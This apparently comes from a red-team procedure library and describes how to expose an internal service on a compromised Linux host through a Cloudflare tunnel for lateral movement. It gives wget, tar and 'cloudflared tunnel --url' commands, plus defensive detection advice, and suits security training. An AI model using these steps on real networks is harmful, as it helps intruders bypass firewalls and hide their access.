---
type: procedure
tactics:
  - '[[Lateral Movement]]'
techniques:
  - '[[Remote Services]]'
sub_techniques: []
tags:
  - cloudflared
  - network-pivoting
  - lateral-movement
commands:
  - '[[commands/download-cloudflared-binary]]'
  - '[[commands/cloudflared-tunnel-expose-service]]'
tools:
  - '[[tools/cloudflared]]'
platforms:
  - Linux
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Cloudflare-Tunnel-Pivoting-for-Lateral-Movement

## Summary

This procedure demonstrates how to use Cloudflare Tunnel (via the cloudflared tool) to expose an internal service on a compromised Linux system to the internet, enabling attackers to pivot laterally within the network and access resources that are not directly reachable from external hosts. By tunneling traffic through Cloudflare's infrastructure, attackers can bypass firewalls and network segmentation while masking their origin.

## Description

Cloudflare Tunnel allows secure exposure of local services to the public internet without opening inbound ports on the firewall. In an attack scenario, after gaining initial access to a compromised host (e.g., via SSH or RCE), an attacker downloads and runs cloudflared to create a tunnel from an internal web service (such as a development server or admin panel) to a public URL provided by Cloudflare. This facilitates lateral movement by allowing the attacker to interact with the internal service remotely as if they were on the local network. The technique leverages Cloudflare's edge network for obfuscation, making it harder for defenders to trace traffic back to the compromised host. It is particularly effective in environments with strict egress filtering but permissive outbound HTTPS connections, as cloudflared communicates over standard web protocols.

## Requirements

1. Compromised access to a Linux host on the target network with outbound internet access (e.g., via SSH shell or reverse shell).
2. An internal service running on the compromised host or reachable network (e.g., a web server on localhost:8080).
3. No Cloudflare account required for basic tunneling, but authentication enhances persistence.
4. Tools: cloudflared binary (downloaded during execution), wget for download.

## Defense

- Implement network segmentation to isolate compromised hosts and limit lateral movement.
- Monitor for anomalous outbound connections to Cloudflare domains (e.g., *.cfargotunnel.com) or unusual DNS queries.
- Use endpoint detection tools to flag unauthorized binary downloads (e.g., wget to equinox.io) and process executions like cloudflared.
- Enforce application whitelisting to prevent running unsigned binaries like cloudflared.
- Log and alert on new tunnels via Cloudflare dashboard if the organization uses Cloudflare.

## Objectives

1. Expose internal services to the attacker's external access point for pivoting.
2. Bypass network controls like firewalls that block direct inbound connections.
3. Maintain operational security by routing traffic through a legitimate CDN provider.

## Instructions

### Step 1: Download and Extract Cloudflared Binary

**Context**: Obtain the cloudflared executable for Linux AMD64 architecture. This step fetches the binary from Cloudflare's official distribution site and extracts it to the current directory, preparing the tool for immediate use on the compromised host. wget is used assuming it's available; alternatives like curl can be substituted if needed.

**Command** ([[commands/download-cloudflared-binary]]):
```bash
wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz
tar xvzf cloudflared-stable-linux-amd64.tgz
```

> This downloads the tarball and extracts the cloudflared binary. Verify the binary with `ls -la cloudflared` to ensure it's executable (chmod +x if necessary). Expected output includes download progress and extraction confirmation; no errors indicate success.

### Step 2: Create Tunnel to Expose Internal Service

**Context**: Launch cloudflared to establish a secure tunnel from the specified internal service to a public Cloudflare URL. This allows external access to the internal host:port without modifying firewall rules. Replace placeholders with actual values (e.g., http://localhost:8080 for a local web server). The tunnel persists until manually stopped.

**Command** ([[commands/cloudflared-tunnel-expose-service]]):
```bash
./cloudflared tunnel --url $_PROTOCOL://$_HOST:$_PORT
```

> Upon execution, cloudflared outputs a public URL (e.g., https://random-subdomain.trycloudflare.com) where the internal service is now accessible. Monitor for connection logs; success is indicated by the tunnel URL being printed and the service responding via the public endpoint. Test by curling the provided URL from an external machine.
